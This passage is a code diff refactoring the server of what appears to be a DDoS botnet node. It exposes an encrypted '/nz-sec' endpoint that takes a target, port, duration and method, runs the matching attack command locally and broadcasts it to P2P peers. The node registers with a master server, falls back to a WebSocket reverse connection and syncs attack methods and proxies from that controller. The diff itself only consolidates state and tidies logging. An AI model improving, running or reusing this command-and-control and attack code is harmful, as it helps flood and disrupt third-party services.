@@ -35,13 +35,13 @@ async function fetchWithTimeout(url, options = {}, timeout = 5000) {
 
 // ======================
 // GLOBAL STATE
+// FIX: Single source of truth — use sharedData exclusively, remove duplicate local vars
 // ======================
 let encryptionManager = null;
 let encryptionInitialized = false;
 
 const fastify = Fastify({ logger: false });
 
-// ESM pengganti __dirname
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
@@ -59,29 +59,11 @@ let heartbeatIntervalId = null;
 let methodsSyncIntervalId = null;
 let backgroundHeartbeat = null;
 let backgroundWSHeartbeat = null;
-let nodeMode = 'DIRECT';
-let isRegistered = false;
-let isReachable = false;
 
 // ======================
-// ATTACK IN PROGRESS CHECK
-// ======================
-/**
- * Returns true if there are currently active attack processes running.
- * Used to defer proxy updates and methods sync during active attacks
- * to ensure stability.
- */
-function isAttackInProgress() {
-  try {
-    const count = executor.getActiveProcessesCount();
-    return count > 0;
-  } catch {
-    return false;
-  }
-}
-
-// ======================
-// SHARED DATA
+// SHARED STATE (single source of truth)
+// FIX: Removed duplicate local vars nodeMode, isRegistered, isReachable.
+//      Always read/write via sharedData.
 // ======================
 const sharedData = {
   config,
@@ -125,6 +107,10 @@ const sharedData = {
 
   setNodeMode(mode) {
     this.nodeMode = mode;
+    // FIX: Keep heartbeat module in sync with node mode
+    if (heartbeatModule?.setNodeMode) {
+      heartbeatModule.setNodeMode(mode);
+    }
   },
 
   setRegistered(status) {
@@ -147,6 +133,20 @@ const sharedData = {
     this.p2pNode = node;
   }
 };
+
+// ======================
+// ATTACK IN PROGRESS CHECK
+// ======================
+function isAttackInProgress() {
+  try {
+    // FIX: Use sharedData.executor for consistency
+    const ex = sharedData.executor;
+    if (!ex) return false;
+    return ex.getActiveProcessesCount() > 0;
+  } catch {
+    return false;
+  }
+}
 
 // ======================
 // METHODS CONFIG
@@ -187,9 +187,7 @@ executor.on('zombie_detected', (data) => {
   if (executor.zombieConfig?.autoKill) {
     console.log('[ZOMBIE] AutoKill handled by Executor');
   } else {
-    console.log(
-      '[ZOMBIE] AutoKill is disabled, manual intervention may be required'
-    );
+    console.log('[ZOMBIE] AutoKill is disabled, manual intervention may be required');
   }
 });
 
@@ -211,6 +209,7 @@ async function initializeEncryption() {
       };
       encryptionManager = new EncryptionManager(encryptionConfig);
       encryptionInitialized = true;
+      sharedData.setEncryptionManager(encryptionManager);
       console.log('[INIT] Encryption system loaded');
       return true;
     } catch (error) {
@@ -383,9 +382,7 @@ async function detectPublicIP() {
       }
     }
 
-    console.log(
-      '[IP-DETECT] Semua service gagal, tidak dapat deteksi IP publik'
-    );
+    console.log('[IP-DETECT] Semua service gagal, tidak dapat deteksi IP publik');
     return null;
   } catch (err) {
     console.log('[IP-DETECT] Gagal deteksi IP publik:', err.message || err);
@@ -432,11 +429,7 @@ async function checkNodeReachability(ip, port) {
 
     if (!res.ok) {
       const text = await res.text();
-      console.error(
-        '[REACHABILITY] Master balas error:',
-        res.status,
-        text
-      );
+      console.error('[REACHABILITY] Master balas error:', res.status, text);
       return {
         reachable: false,
         reason: `master error ${res.status}`
@@ -483,13 +476,10 @@ async function determineNetworkMode() {
     config.SERVER.PORT
   );
 
-  isReachable = reachability.reachable;
-  sharedData.setReachable(isReachable);
+  sharedData.setReachable(reachability.reachable);
 
   if (reachability.reachable) {
-    console.log(
-      '[INIT] ✓ Node is reachable from master, using DIRECT mode'
-    );
+    console.log('[INIT] ✓ Node is reachable from master, using DIRECT mode');
     return {
       mode: 'DIRECT',
       ip: publicIp,
@@ -497,17 +487,13 @@ async function determineNetworkMode() {
       reason: reachability.reason
     };
   } else {
-    console.log(
-      '[INIT] ✗ Node is NOT reachable from master, using REVERSE mode'
-    );
+    console.log('[INIT] ✗ Node is NOT reachable from master, using REVERSE mode');
     console.log(`[INIT] Reason: ${reachability.reason}`);
 
     if (config.MASTER?.WS_URL) {
       console.log('[INIT] WebSocket URL available for reverse mode');
     } else {
-      console.log(
-        '[INIT] WARNING: WebSocket URL not configured, reverse mode may not work'
-      );
+      console.log('[INIT] WARNING: WebSocket URL not configured, reverse mode may not work');
     }
 
     return {
@@ -523,23 +509,20 @@ async function determineNetworkMode() {
 // METHODS SYNC (P2P + MASTER)
 // ======================
 async function syncMethods() {
-  // ── ATTACK GUARD ──────────────────────────────────────────────────────────
   if (isAttackInProgress()) {
     const activeCount = executor.getActiveProcessesCount();
     console.log(
-      `[SYNC] ⚠ Skipped — ${activeCount} active attack process(es) running. ` +
-      `Sync will resume after attack completes.`
+      `[SYNC] ⚠ Skipped — ${activeCount} active attack process(es) running.`
     );
     return { success: false, skipped: true, reason: 'attack_in_progress', activeProcesses: activeCount };
   }
-  // ─────────────────────────────────────────────────────────────────────────
 
   try {
-    // Prefer P2P sync jika ada peers
+    // Prefer P2P sync if peers are available
     if (
       p2pNode &&
       p2pNode.peers.size > 0 &&
-      p2pNode.p2pConfig.preferP2PSync
+      p2pNode.p2pConfig?.preferP2PSync
     ) {
       console.log('[SYNC] Attempting P2P method sync...');
       const p2pResult = await p2pNode.syncMethodsFromPeers();
@@ -550,40 +533,31 @@ async function syncMethods() {
 
         setImmediate(() => {
           const propagated = p2pNode.propagateMethodsUpdateImmediate();
-          console.log(
-            `[SYNC] ✓ Propagated to ${propagated} peer(s) immediately`
-          );
+          console.log(`[SYNC] ✓ Propagated to ${propagated} peer(s) immediately`);
         });
 
         return p2pResult;
       } else {
-        console.log(
-          '[SYNC] P2P sync not available or not newer, falling back to master'
-        );
+        console.log('[SYNC] P2P sync not available or not newer, falling back to master');
       }
     }
 
-    // Fallback ke master sync
+    // Fallback to master sync
     const { syncMethodsWithMaster } = methodSyncModule;
     const result = await syncMethodsWithMaster(config);
 
     if (result && result.success && !result.up_to_date) {
-      // Update local config
+      // FIX: Single refreshMethodsConfig call (removed duplicate)
       refreshMethodsConfig();
 
-      // Propagate ke peers
       if (p2pNode && p2pNode.peers.size > 0) {
-        console.log(
-          '[SYNC] Propagating methods update to P2P peers IMMEDIATELY...'
-        );
+        console.log('[SYNC] Propagating methods update to P2P peers IMMEDIATELY...');
 
         p2pNode.updateMethodsConfig(sharedData.methodsConfig);
 
         setImmediate(() => {
           const propagated = p2pNode.propagateMethodsUpdateImmediate();
-          console.log(
-            `[SYNC] ✓ Propagated to ${propagated} peer(s) with ZERO delay`
-          );
+          console.log(`[SYNC] ✓ Propagated to ${propagated} peer(s) with ZERO delay`);
         });
 
         p2pNode.stats.methodSyncsToMaster++;
@@ -603,17 +577,13 @@ async function forceImmediatePropagation() {
     return 0;
   }
 
-  console.log(
-    '[FORCE-PROPAGATE] Forcing immediate propagation to all peers...'
-  );
+  console.log('[FORCE-PROPAGATE] Forcing immediate propagation to all peers...');
 
   p2pNode.updateMethodsConfig(sharedData.methodsConfig);
 
   const propagated = p2pNode.propagateMethodsUpdateImmediate();
 
-  console.log(
-    `[FORCE-PROPAGATE] ✓ Propagated to ${propagated} peer(s) immediately`
-  );
+  console.log(`[FORCE-PROPAGATE] ✓ Propagated to ${propagated} peer(s) immediately`);
 
   return propagated;
 }
@@ -623,9 +593,7 @@ async function forceImmediatePropagation() {
 // ======================
 fastify.post(
   '/nz-sec',
-  {
-    preHandler: encryptionDecorator
-  },
+  { preHandler: encryptionDecorator },
   async (request, reply) => {
     try {
       const { target, time, port: reqPort, methods } = request.body;
@@ -634,10 +602,7 @@ fastify.post(
       if (!validation.isValid) {
         return sendEncryptedResponse(
           reply,
-          {
-            status: 'error',
-            error: validation.errors.join(', ')
-          },
+          { status: 'error', error: validation.errors.join(', ') },
           'error'
         );
       }
@@ -653,10 +618,7 @@ fastify.post(
       if (!methodCfg?.cmd) {
         return sendEncryptedResponse(
           reply,
-          {
-            status: 'error',
-            error: config.MESSAGES.INVALID_METHOD
-          },
+          { status: 'error', error: config.MESSAGES.INVALID_METHOD },
           'error'
         );
       }
@@ -667,7 +629,6 @@ fastify.post(
         port: validatedPort
       });
 
-      // 1) Execute attack locally
       const localResult = await executor.execute(command, {
         expectedDuration: validatedTime
       });
@@ -678,14 +639,9 @@ fastify.post(
         pid: localResult.pid
       });
 
-      // 2) Broadcast to P2P peers (async)
       let p2pSummary = null;
 
-      if (
-        p2pNode &&
-        p2pNode.p2pConfig.enabled &&
-        p2pNode.peers.size > 0
-      ) {
+      if (p2pNode && p2pNode.p2pConfig.enabled && p2pNode.peers.size > 0) {
         console.log(
           `[SECURE-EXEC] Broadcasting attack to ${p2pNode.peers.size} P2P peer(s)...`
         );
@@ -701,16 +657,10 @@ fastify.post(
 
           p2pPromise
             .then((result) => {
-              console.log(
-                '[SECURE-EXEC] P2P broadcast completed:',
-                result.summary
-              );
+              console.log('[SECURE-EXEC] P2P broadcast completed:', result.summary);
             })
             .catch((error) => {
-              console.error(
-                '[SECURE-EXEC] P2P broadcast error:',
-                error.message
-              );
+              console.error('[SECURE-EXEC] P2P broadcast error:', error.message);
             });
 
           p2pSummary = {
@@ -722,22 +672,11 @@ fastify.post(
             async: true
           };
         } catch (error) {
-          console.error(
-            '[SECURE-EXEC] P2P broadcast error:',
-            error.message
-          );
-          p2pSummary = {
-            success: false,
-            error: error.message
-          };
+          console.error('[SECURE-EXEC] P2P broadcast error:', error.message);
+          p2pSummary = { success: false, error: error.message };
         }
-      } else {
-        console.log(
-          '[SECURE-EXEC] P2P not available or no peers, skip broadcast'
-        );
       }
 
-      // 3) Send response
       sendEncryptedResponse(
         reply,
         {
@@ -756,9 +695,7 @@ fastify.post(
                 peers_connected: p2pNode.peers.size,
                 broadcast: p2pSummary
               }
-            : {
-                enabled: false
-              }
+            : { enabled: false }
         },
         'attack_response'
       );
@@ -781,18 +718,13 @@ fastify.post(
 
 fastify.post(
   '/heartbeat-sec',
-  {
-    preHandler: encryptionDecorator
-  },
+  { preHandler: encryptionDecorator },
   async (request, reply) => {
     try {
       if (!heartbeatModule) {
         return sendEncryptedResponse(
           reply,
-          {
-            status: 'error',
-            error: 'Heartbeat module not initialized'
-          },
+          { status: 'error', error: 'Heartbeat module not initialized' },
           'error'
         );
       }
@@ -827,34 +759,21 @@ fastify.get('/process/kill/:id', async (request, reply) => {
   const processId = parseInt(request.params.id, 10);
 
   if (Number.isNaN(processId)) {
-    return reply.status(400).send({
-      status: 'error',
-      error: 'Invalid process ID'
-    });
+    return reply.status(400).send({ status: 'error', error: 'Invalid process ID' });
   }
 
   const killed = executor.killProcess(processId);
 
   if (killed) {
-    reply.send({
-      status: 'ok',
-      message: `Process ${processId} killed successfully`
-    });
+    reply.send({ status: 'ok', message: `Process ${processId} killed successfully` });
   } else {
-    reply.status(404).send({
-      status: 'error',
-      error: `Process ${processId} not found`
-    });
+    reply.status(404).send({ status: 'error', error: `Process ${processId} not found` });
   }
 });
 
 fastify.get('/process/kill-all', async (request, reply) => {
   const killed = executor.killAllProcesses();
-
-  reply.send({
-    status: 'ok',
-    message: `Killed ${killed} processes`
-  });
+  reply.send({ status: 'ok', message: `Killed ${killed} processes` });
 });
 
 fastify.get('/health', async (request, reply) => {
@@ -863,9 +782,9 @@ fastify.get('/health', async (request, reply) => {
     node_id: config.NODE.ID,
     timestamp: new Date().toISOString(),
     encryption: encryptionInitialized && !!config.ENCRYPTION?.ENABLED,
-    mode: nodeMode,
-    reachable: isReachable,
-    registered: isRegistered,
+    mode: sharedData.nodeMode,
+    reachable: sharedData.isReachable,
+    registered: sharedData.isRegistered,
     methods_count: Object.keys(sharedData.methodsConfig).length,
     ip: config.NODE.IP || 'unknown',
     port: config.SERVER.PORT,
@@ -876,68 +795,42 @@ fastify.get('/health', async (request, reply) => {
   });
 });
 
-// P2P Status Endpoint
 fastify.get('/p2p/status', async (request, reply) => {
   if (!p2pNode) {
-    return reply.send({
-      enabled: false,
-      message: 'P2P is not initialized'
-    });
+    return reply.send({ enabled: false, message: 'P2P is not initialized' });
   }
-
   reply.send(p2pNode.getStatus());
 });
 
-// P2P Connect to Peer Endpoint
 fastify.post('/p2p/connect', async (request, reply) => {
   if (!p2pNode) {
-    return reply.status(503).send({
-      status: 'error',
-      error: 'P2P is not initialized'
-    });
+    return reply.status(503).send({ status: 'error', error: 'P2P is not initialized' });
   }
 
   const { nodeId, ip, port } = request.body || {};
 
   if (!nodeId || !ip || !port) {
-    return reply.status(400).send({
-      status: 'error',
-      error: 'Missing nodeId, ip, or port'
-    });
+    return reply.status(400).send({ status: 'error', error: 'Missing nodeId, ip, or port' });
   }
 
   const result = await p2pNode.connectToPeer(nodeId, { ip, port });
 
-  reply.send({
-    status: result.success ? 'ok' : 'error',
-    ...result
-  });
+  reply.send({ status: result.success ? 'ok' : 'error', ...result });
 });
 
-// P2P Method Sync Endpoint
 fastify.post('/p2p/sync-methods', async (request, reply) => {
   if (!p2pNode) {
-    return reply.status(503).send({
-      status: 'error',
-      error: 'P2P is not initialized'
-    });
+    return reply.status(503).send({ status: 'error', error: 'P2P is not initialized' });
   }
 
-  // Allow manual sync via API even during attack (operator decision)
   const result = await p2pNode.syncMethodsFromPeers();
 
-  reply.send({
-    status: result.success !== false ? 'ok' : 'error',
-    ...result
-  });
+  reply.send({ status: result.success !== false ? 'ok' : 'error', ...result });
 });
 
 fastify.post('/p2p/propagate-methods', async (request, reply) => {
   if (!p2pNode) {
-    return reply.status(503).send({
-      status: 'error',
-      error: 'P2P is not initialized'
-    });
+    return reply.status(503).send({ status: 'error', error: 'P2P is not initialized' });
   }
 
   try {
@@ -952,10 +845,7 @@ fastify.post('/p2p/propagate-methods', async (request, reply) => {
       timestamp: new Date().toISOString()
     });
   } catch (error) {
-    reply.status(500).send({
-      status: 'error',
-      error: error.message
-    });
+    reply.status(500).send({ status: 'error', error: error.message });
   }
 });
 
@@ -972,13 +862,9 @@ fastify.post('/p2p/tunnel', async (request, reply) => {
 
   const result = await p2pNode.sendViaTunnel(targetNodeId, payload, messageType);
 
-  reply.send({
-    status: result.success ? 'ok' : 'error',
-    ...result
-  });
+  reply.send({ status: result.success ? 'ok' : 'error', ...result });
 });
 
-// P2P Reverse Pool Status
 fastify.get('/p2p/reverse-pool', async (request, reply) => {
   if (!p2pNode) {
     return reply.status(503).send({ status: 'error', error: 'P2P is not initialized' });
@@ -997,11 +883,8 @@ fastify.get('/p2p/reverse-pool', async (request, reply) => {
 
   reply.send({
     status: 'ok',
-    reversePool: {
-      count: p2pNode.reversePeers.size,
-      nodes: reverseNodes
-    },
-    nodeMode: nodeMode
+    reversePool: { count: p2pNode.reversePeers.size, nodes: reverseNodes },
+    nodeMode: sharedData.nodeMode
   });
 });
 
@@ -1016,25 +899,18 @@ fastify.get('/p2p/known-reverse', async (request, reply) => {
 
   reply.send({
     status: 'ok',
-    nodeMode,
-    knownReversePeers: {
-      count: routes.length,
-      routes
-    }
+    nodeMode: sharedData.nodeMode,
+    knownReversePeers: { count: routes.length, routes }
   });
 });
+
 // ======================
 // INITIALIZATION HELPERS
 // ======================
 async function initializeModules() {
   console.log('[INIT] Initializing modules...');
 
-  if (!sharedData.executor) {
-    sharedData.executor = executor;
-  }
-
   await initializeEncryption();
-  sharedData.setEncryptionManager(encryptionManager);
 
   if (!heartbeatModule) {
     heartbeatModule = await createHeartbeat(
@@ -1042,6 +918,10 @@ async function initializeModules() {
       executor,
       sharedData.methodsConfig
     );
+    // FIX: Sync node mode to heartbeat module after creation
+    if (heartbeatModule?.setNodeMode) {
+      heartbeatModule.setNodeMode(sharedData.nodeMode);
+    }
     console.log('[INIT] Heartbeat module created');
   }
 
@@ -1057,17 +937,11 @@ async function initializeModules() {
         console.log('[INIT] ✓ Master server is reachable');
         return true;
       } else {
-        console.log(
-          '[INIT] ✗ Master server responded with error:',
-          testResponse.status
-        );
+        console.log('[INIT] ✗ Master server responded with error:', testResponse.status);
         return false;
       }
     } catch (error) {
-      console.log(
-        '[INIT] ✗ Cannot reach master server:',
-        error.message
-      );
+      console.log('[INIT] ✗ Cannot reach master server:', error.message);
       return false;
     }
   } else {
@@ -1080,11 +954,11 @@ async function initializeModules() {
 // MODE-BASED OPERATIONS
 // ======================
 function startModeBasedOperations(heartbeatInterval, methodsSyncInterval) {
-  console.log(`[INIT] Starting operations for ${nodeMode} mode...`);
+  console.log(`[INIT] Starting operations for ${sharedData.nodeMode} mode...`);
 
-  if (nodeMode === 'DIRECT') {
+  if (sharedData.nodeMode === 'DIRECT') {
     startDirectMode(heartbeatInterval, methodsSyncInterval);
-  } else if (nodeMode === 'REVERSE') {
+  } else if (sharedData.nodeMode === 'REVERSE') {
     startReverseMode(heartbeatInterval, methodsSyncInterval);
   } else {
     startStandaloneMode();
@@ -1093,9 +967,6 @@ function startModeBasedOperations(heartbeatInterval, methodsSyncInterval) {
 
 function startDirectMode(heartbeatInterval, methodsSyncInterval) {
   console.log('[INIT] Starting DIRECT mode operations...');
-  console.log(
-    '[INIT] ⏳ Waiting for successful registration before starting other services...'
-  );
 
   setTimeout(async () => {
     try {
@@ -1104,24 +975,12 @@ function startDirectMode(heartbeatInterval, methodsSyncInterval) {
         return;
       }
 
-      if (
-        typeof heartbeatModule !== 'object' ||
-        typeof heartbeatModule.autoRegister !== 'function'
-      ) {
-        console.error(
-          '[INIT] ✗ Heartbeat module is invalid!',
-          typeof heartbeatModule
-        );
-        console.error(
-          '[INIT] Available keys:',
-          Object.keys(heartbeatModule || {})
-        );
+      if (typeof heartbeatModule !== 'object' || typeof heartbeatModule.autoRegister !== 'function') {
+        console.error('[INIT] ✗ Heartbeat module is invalid!');
         return;
       }
 
-      console.log(
-        '[INIT] 🔄 Attempting registration to master (DIRECT mode)...'
-      );
+      console.log('[INIT] 🔄 Attempting registration to master (DIRECT mode)...');
 
       const registerResult = await heartbeatModule.autoRegister();
 
@@ -1129,172 +988,94 @@ function startDirectMode(heartbeatInterval, methodsSyncInterval) {
         console.log('='.repeat(80));
         console.log('[INIT] ✅ REGISTRATION SUCCESSFUL (DIRECT mode)');
         console.log('='.repeat(80));
-        isRegistered = true;
         sharedData.setRegistered(true);
 
-        console.log(
-          '\n[POST-REGISTRATION] Starting post-registration services...\n'
-        );
-
         // 1. Start heartbeat service
-        console.log(
-          '[POST-REGISTRATION] 1/5 Starting heartbeat service...'
-        );
+        console.log('\n[POST-REGISTRATION] 1/5 Starting heartbeat service...');
         startHeartbeatService(heartbeatInterval);
-        console.log('[POST-REGISTRATION] ✓ Heartbeat service started');
 
-        // 2. Initial methods sync
-        console.log(
-          '\n[POST-REGISTRATION] 2/5 Performing initial methods sync...'
-        );
+        // 2. Initial methods sync (with single refresh)
+        console.log('\n[POST-REGISTRATION] 2/5 Performing initial methods sync...');
         setTimeout(async () => {
           try {
             const syncResult = await syncMethods();
             if (syncResult && syncResult.success) {
-              console.log(
-                '[POST-REGISTRATION] ✓ Initial methods sync completed'
-              );
-              console.log(
-                `[POST-REGISTRATION] Methods count: ${Object.keys(
-                  sharedData.methodsConfig
-                ).length}`
-              );
-              refreshMethodsConfig();
-
+              console.log('[POST-REGISTRATION] ✓ Initial methods sync completed');
+              // FIX: syncMethods already calls refreshMethodsConfig internally
+              // No need for an extra refreshMethodsConfig() here
               if (p2pNode) {
                 p2pNode.updateMethodsConfig(sharedData.methodsConfig);
-                console.log(
-                  '[POST-REGISTRATION] ✓ P2P node updated with latest methods'
-                );
               }
             } else if (syncResult?.skipped) {
-              console.log(
-                '[POST-REGISTRATION] ⚠ Initial methods sync skipped (attack in progress), will retry periodically'
-              );
+              console.log('[POST-REGISTRATION] ⚠ Initial methods sync skipped (attack in progress)');
             } else {
-              console.log(
-                '[POST-REGISTRATION] ⚠ Initial methods sync failed or up-to-date, will retry periodically'
-              );
+              console.log('[POST-REGISTRATION] ⚠ Initial methods sync failed or up-to-date');
             }
           } catch (error) {
-            console.error(
-              '[POST-REGISTRATION] ✗ Initial methods sync error:',
-              error.message
-            );
+            console.error('[POST-REGISTRATION] ✗ Initial methods sync error:', error.message);
           }
         }, 2000);
 
-        // 3. Start proxy updater (if enabled)
+        // 3. Start proxy updater
         if (config.PROXY?.AUTO_UPDATE) {
-          console.log(
-            '\n[POST-REGISTRATION] 3/5 Starting proxy auto-updater...'
-          );
+          console.log('\n[POST-REGISTRATION] 3/5 Starting proxy auto-updater...');
           setTimeout(() => {
             if (!proxyUpdater) {
-              console.log(
-                '[POST-REGISTRATION] ⚠ Proxy updater not initialized, skipping'
-              );
+              console.log('[POST-REGISTRATION] ⚠ Proxy updater not initialized, skipping');
               return;
             }
 
-            const interval =
-              config.PROXY.UPDATE_INTERVAL_MINUTES || 10;
+            const interval = config.PROXY.UPDATE_INTERVAL_MINUTES || 10;
             proxyUpdater.startAutoUpdate(interval, executor);
-            console.log(
-              `[POST-REGISTRATION] ✓ Proxy auto-update started (every ${interval} minutes)`
-            );
+            console.log(`[POST-REGISTRATION] ✓ Proxy auto-update started (every ${interval} minutes)`);
           }, 3000);
         } else {
-          console.log(
-            '\n[POST-REGISTRATION] 3/5 Proxy auto-updater disabled'
-          );
+          console.log('\n[POST-REGISTRATION] 3/5 Proxy auto-updater disabled');
         }
 
         // 4. P2P info
         if (p2pNode?.p2pConfig.enabled) {
-          console.log(
-            '\n[POST-REGISTRATION] 4/5 P2P services already running...'
-          );
+          console.log('\n[POST-REGISTRATION] 4/5 P2P services already running...');
           setTimeout(() => {
-            console.log(
-              `[POST-REGISTRATION] ✓ P2P Status: ${p2pNode.peers.size} peers connected`
-            );
+            console.log(`[POST-REGISTRATION] ✓ P2P Status: ${p2pNode.peers.size} peers connected`);
           }, 4000);
         } else {
-          console.log(
-            '\n[POST-REGISTRATION] 4/5 P2P disabled or not initialized'
-          );
+          console.log('\n[POST-REGISTRATION] 4/5 P2P disabled or not initialized');
         }
 
         // 5. Periodic sync
-        console.log(
-          '\n[POST-REGISTRATION] 5/5 Starting periodic sync...'
-        );
+        console.log('\n[POST-REGISTRATION] 5/5 Starting periodic sync...');
         startPeriodicP2PSync(methodsSyncInterval);
-        console.log('[POST-REGISTRATION] ✓ Periodic sync started');
 
         console.log('\n' + '='.repeat(80));
-        console.log(
-          '[POST-REGISTRATION] ✅ ALL POST-REGISTRATION SERVICES STARTED SUCCESSFULLY'
-        );
+        console.log('[POST-REGISTRATION] ✅ ALL POST-REGISTRATION SERVICES STARTED SUCCESSFULLY');
         console.log('='.repeat(80));
         console.log(
-          `[READY] Node ready - Mode: ${nodeMode}, Registered: ${isRegistered}, Reachable: ${isReachable}`
-        );
-        console.log(
-          `[READY] Methods: ${Object.keys(sharedData.methodsConfig).length}, ` +
-            `Encryption: ${
-              config.ENCRYPTION?.ENABLED && encryptionInitialized
-                ? 'ON'
-                : 'OFF'
-            }`
-        );
-        console.log(
-          `[READY] P2P: ${p2pNode ? 'ENABLED' : 'DISABLED'}, ` +
-            `P2P Peers: ${p2pNode ? p2pNode.peers.size : 0}`
+          `[READY] Node ready - Mode: ${sharedData.nodeMode}, ` +
+          `Registered: ${sharedData.isRegistered}, Reachable: ${sharedData.isReachable}`
         );
         console.log('='.repeat(80) + '\n');
+
       } else {
-        console.log('='.repeat(80));
-        console.log(
-          '[INIT] ✗ REGISTRATION FAILED (DIRECT mode):',
-          registerResult.error
-        );
-        console.log('='.repeat(80));
+        console.log('[INIT] ✗ REGISTRATION FAILED:', registerResult.error);
 
         if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
-          console.log(
-            '[INIT] 🔄 Attempting fallback to REVERSE mode...\n'
-          );
-          nodeMode = 'REVERSE';
+          console.log('[INIT] 🔄 Attempting fallback to REVERSE mode...');
           sharedData.setNodeMode('REVERSE');
           startReverseMode(heartbeatInterval, methodsSyncInterval);
         } else {
-          console.log(
-            '[INIT] ⏳ Will retry registration in 30 seconds...\n'
-          );
+          console.log('[INIT] ⏳ Will retry registration in 30 seconds...');
           setTimeout(
-            () =>
-              retryRegistration(heartbeatInterval, methodsSyncInterval),
+            () => retryRegistration(heartbeatInterval, methodsSyncInterval),
             30000
           );
         }
       }
     } catch (error) {
-      console.error('\n' + '='.repeat(80));
-      console.error(
-        '[INIT] ✗ ERROR IN DIRECT MODE STARTUP'
-      );
-      console.error('='.repeat(80));
-      console.error('[INIT] Error:', error.message);
-      console.error('[INIT] Stack trace:', error.stack);
-      console.error('='.repeat(80) + '\n');
+      console.error('[INIT] ✗ ERROR IN DIRECT MODE STARTUP:', error.message);
 
       if (config.MASTER?.WS_URL && config.REVERSE?.ENABLE_AUTO) {
-        console.log(
-          '[INIT] 🔄 Falling back to REVERSE mode after error...\n'
-        );
-        nodeMode = 'REVERSE';
+        console.log('[INIT] 🔄 Falling back to REVERSE mode after error...');
         sharedData.setNodeMode('REVERSE');
         startReverseMode(heartbeatInterval, methodsSyncInterval);
       }
@@ -1304,14 +1085,9 @@ function startDirectMode(heartbeatInterval, methodsSyncInterval) {
 
 function startReverseMode(heartbeatInterval, methodsSyncInterval) {
   console.log('[INIT] Starting REVERSE mode operations...');
-  console.log(
-    '[INIT] ⏳ Waiting for WebSocket connection and registration...'
-  );
 
   if (!config.MASTER?.WS_URL) {
-    console.log(
-      '[INIT] ✗ ERROR: MASTER.WS_URL not configured for REVERSE mode'
-    );
+    console.log('[INIT] ✗ ERROR: MASTER.WS_URL not configured for REVERSE mode');
     console.log('[INIT] Falling back to STANDALONE mode');
     startStandaloneMode();
     return;
@@ -1324,18 +1100,13 @@ function startReverseMode(heartbeatInterval, methodsSyncInterval) {
       sharedData.methodsConfig
     );
   } catch (error) {
-    console.error(
-      '[INIT] ✗ Failed to create reverse client:',
-      error.message
-    );
+    console.error('[INIT] ✗ Failed to create reverse client:', error.message);
     console.log('[INIT] Falling back to STANDALONE mode');
     startStandaloneMode();
     return;
   }
 
-  console.log(
-    '[REVERSE-INIT] 🔄 Connecting to master via WebSocket...'
-  );
+  console.log('[REVERSE-INIT] 🔄 Connecting to master via WebSocket...');
   reverseClient.connect();
 
   let connectionCheckAttempts = 0;
@@ -1355,108 +1126,60 @@ function startReverseMode(heartbeatInterval, methodsSyncInterval) {
         const registerResult = await reverseClient.registerWithMaster();
 
         if (registerResult.success) {
-          console.log('='.repeat(80));
-          console.log(
-            '[REVERSE] ✅ REGISTRATION SUCCESSFUL (via REST)'
-          );
-          console.log('='.repeat(80));
-          isRegistered = true;
+          console.log('[REVERSE] ✅ REGISTRATION SUCCESSFUL (via REST)');
           sharedData.setRegistered(true);
 
-          console.log(
-            '\n[POST-REGISTRATION] Starting post-registration services...\n'
-          );
-
           // 1. WebSocket heartbeat
-          console.log(
-            '[POST-REGISTRATION] 1/4 Starting WebSocket heartbeat...'
-          );
+          console.log('\n[POST-REGISTRATION] 1/4 Starting WebSocket heartbeat...');
           if (reverseClient.startBackgroundHeartbeat) {
-            backgroundWSHeartbeat =
-              reverseClient.startBackgroundHeartbeat(
-                heartbeatInterval
-              );
+            backgroundWSHeartbeat = reverseClient.startBackgroundHeartbeat(heartbeatInterval);
             backgroundWSHeartbeat.start();
-            console.log(
-              `[POST-REGISTRATION] ✓ WebSocket heartbeat started (every ${heartbeatInterval}ms)`
-            );
+            console.log(`[POST-REGISTRATION] ✓ WebSocket heartbeat started`);
           }
 
           // 2. Initial methods sync
-          console.log(
-            '\n[POST-REGISTRATION] 2/4 Performing initial methods sync...'
-          );
+          console.log('\n[POST-REGISTRATION] 2/4 Performing initial methods sync...');
           setTimeout(async () => {
             try {
               const syncResult = await syncMethods();
               if (syncResult && syncResult.success) {
-                console.log(
-                  '[POST-REGISTRATION] ✓ Initial methods sync completed'
-                );
-                refreshMethodsConfig();
-
+                console.log('[POST-REGISTRATION] ✓ Initial methods sync completed');
+                // FIX: syncMethods already calls refreshMethodsConfig, no duplicate
                 if (p2pNode) {
                   p2pNode.updateMethodsConfig(sharedData.methodsConfig);
                 }
               }
             } catch (error) {
-              console.error(
-                '[POST-REGISTRATION] ✗ Methods sync error:',
-                error.message
-              );
+              console.error('[POST-REGISTRATION] ✗ Methods sync error:', error.message);
             }
           }, 2000);
 
           // 3. Proxy updater
           if (config.PROXY?.AUTO_UPDATE && proxyUpdater) {
-            console.log(
-              '\n[POST-REGISTRATION] 3/4 Starting proxy auto-updater...'
-            );
+            console.log('\n[POST-REGISTRATION] 3/4 Starting proxy auto-updater...');
             setTimeout(() => {
-              const interval =
-                config.PROXY.UPDATE_INTERVAL_MINUTES || 10;
+              const interval = config.PROXY.UPDATE_INTERVAL_MINUTES || 10;
               proxyUpdater.startAutoUpdate(interval, executor);
-              console.log(
-                '[POST-REGISTRATION] ✓ Proxy auto-update started'
-              );
+              console.log('[POST-REGISTRATION] ✓ Proxy auto-update started');
             }, 3000);
           }
 
           // 4. Periodic sync
-          console.log(
-            '\n[POST-REGISTRATION] 4/4 Starting periodic sync...'
-          );
+          console.log('\n[POST-REGISTRATION] 4/4 Starting periodic sync...');
           startPeriodicP2PSync(methodsSyncInterval);
 
           console.log('\n' + '='.repeat(80));
-          console.log(
-            '[POST-REGISTRATION] ✅ ALL SERVICES STARTED SUCCESSFULLY (REVERSE MODE)'
-          );
-          console.log('='.repeat(80));
-          console.log(
-            `[READY] Node ready - Mode: ${nodeMode}, Registered: ${isRegistered}`
-          );
+          console.log('[POST-REGISTRATION] ✅ ALL SERVICES STARTED SUCCESSFULLY (REVERSE MODE)');
           console.log('='.repeat(80) + '\n');
         } else {
-          console.log(
-            '[REVERSE] ⚠ REST registration failed:',
-            registerResult.error
-          );
-          console.log(
-            '[REVERSE] Will retry via WebSocket messages'
-          );
+          console.log('[REVERSE] ⚠ REST registration failed:', registerResult.error);
         }
       } catch (error) {
-        console.error(
-          '[REVERSE] ✗ REST registration error:',
-          error.message
-        );
+        console.error('[REVERSE] ✗ REST registration error:', error.message);
       }
     } else if (connectionCheckAttempts >= maxConnectionCheckAttempts) {
       clearInterval(setupInterval);
-      console.log(
